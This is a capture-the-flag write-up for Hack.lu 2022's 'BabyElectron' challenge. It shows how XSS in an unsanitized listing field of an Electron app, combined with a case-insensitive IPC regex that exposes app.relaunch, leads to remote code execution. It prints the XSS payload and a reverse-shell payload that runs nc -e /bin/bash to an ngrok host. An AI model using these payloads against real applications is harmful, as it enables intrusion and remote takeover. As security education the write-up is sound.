---
layout: writeup
title:  "BabyElectron"
source: "flu.xxx"
solves: "19/718"
date:   2022-10-29 11:10:05 +0200
event: "Hack.lu 2022 CTF"
categories: [writeup]
ctf_categories: [web, XSS, RCE]
author: "Mike L."
image: "electron.png"
---

## Description
So you wanted to get into Electron Pwning? Your friend found a nice app, leaked its backend source from a Github repo he found while doxing some Luxembourg Real Estate Company. Pwn away by getting RCE! If you run into problems while setting it up reach out. This is the first flagstore for babyelectron. 

There are two flags: one in /flag which you can submit here and one in /printflag which you can submit at babyelectronV2

# The challenge
The whole source code of the app, as well as the server-side code was provided.

The electon app could be used used to buy, sell and report real estate objects.
You can also report a real estate listing, which is then checked by a bot. 
The goal is to get code execution of the machine of the bot, which is visiting the reported listing.


# The solution
The solution comprised two steps: 
- First, you needed to get XSS in the electron app.
- Second, you needed to abuse the IPC function and get RCE.

## Setup
To make our lives easier, we started the electon app with: `electron . --proxy-server=127.0.0.1:8080` to be able to route the traffic of the app through burp.
Furhtermore, we enabled the developer tools by commenting out: `mainWindow.webContents.openDevTools()` in main.js

## First step - Getting XSS
In the support.js function from the `app` code, we see the following:

```
// security we learned from a bugbounty report
    listing.msg = DOMPurify.sanitize(listing.msg)

    const div = `
        <div class="card col-xs-3" style="width: 18rem;">
            <span id="REL-0-houseId" style="display: none;">${listing.houseId}</span>
            <img class="card-img-top" id="REL-0-image" src="../${listing.image}" alt="REL-img">
            <div class="card-body">
              <h5 class="card-title" id="REL-0-name">${listing.name}</h5>
              <h6 class="card-subtitle mb-2 text-muted" id="REL-0-sqm">${listing.sqm} sqm</h6>
              <p class="card-text" id="REL-0-message">${listing.message}</p>
              <input type="number" class="form-control" id="REL-0-price" placeholder="${listing.price}">
            </div>
        </div>
        <div>
            ${listing.msg}
        </div>
  `
```
listing.msg does get sanitized, however the other parameter do not.
The idea is to get script execution using `listing.message` parameter.

On the first impression its only possible to write the listing.msg parameter which gets posted with the report to get XSS.
As its gets sanitized, this is not possible.

However, when selling a real estate you can specify the `listing.message` when intercepting the message with burp.
So we altered the message parameter of to `<img src=x onerror=\"alert(1);\">`

Then, we checked if the XSS worked, by visiting the support page with out own electron app. 
Therefor we simply added a reference index.html s.t. it also had a link to the support page:

```html
<li class="nav-item">
    <a class="nav-link" href="../views/support.html">
      Support
    </a>
</li>
```
And also included links on the support.html page to navigate back to the other pages:
```html
<div>
    <a href="../views/index.html">Home</a>
    <a  href="../views/listings.html">Buy</a>
    <a  href="../views/portfolio.html">My Portfolio</a>
    <a  href="../views/support.html">Support</a>
</div>
```

We then navigated to the support page and intercepted the http request with burp and filled in the id, given when reporting the listing.
Thus, we could confirm the XSS.

## Step 2

Now we need to get RCE with the XSS.
Hacktricks has a nice atricle on how to get RCE from XSS in electon: https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps
As contextIsolation is tured on - `contextIsolation: true` in main.js, we figured, that we could give it a try via RCE via IPC.

The preload.js contained the following:

```js
const RendererApi = {
  invoke: (action, ...args)  => {
      return ipcRenderer.send("RELaction",action, args);
  },
};
```
It looks like we have a ipc method called `invoke`.
Lets check which function it allows us to execute in main.js:

```js
app.RELbuy = function(listingId){
  return
}

app.RELsell = function(houseId, price, duration){
  return
}

app.RELinfo = function(houseId){
  return
}

app.RElist = function(listingId){
  return
}

app.RELsummary = function(userId){
 return 
}

ipcMain.on("RELaction", (_e, action, args)=>{
  //if(["RELbuy", "RELsell", "RELinfo"].includes(action)){
  if(/^REL/i.test(action)){
    app[action](...args)  
  }else{
    // ?? 
  }
})
```

It looks like we can execute every method that starts with REL. However, the regex check is case insensitive.
Lets see if we can find an electon api app function whose name start with `rel` that might be useful. 
We find `relaunch` https://www.electronjs.org/de/docs/latest/api/app

After a bit of trial and error and reading the docs, we could achive RCE with this javascript function: 
`api.invoke("relaunch", {args: ["4.tcp.ngrok.io", "133573", "-e", "/bin/bash"], execPath:"nc"})`

Now we just needed to put that into our XSS script and let the bot visit it to get a reverse shell back.

We posted that to /sell:
```json
"message" : "<img src=x onerror=\'api.invoke('relaunch', {args: ['4.tcp.ngrok.io', '133573', '-e', '/bin/bash'], execPath:'nc'})\">"
```
We then got the id back, which we then submitted to the bot and got a shell back. The shell only lasted for 15 secs, so we needed to be quick to print out both flag ^^. but after some attemts we got both flags.

Big thanks to Alain who helped a lot during the challenge. :)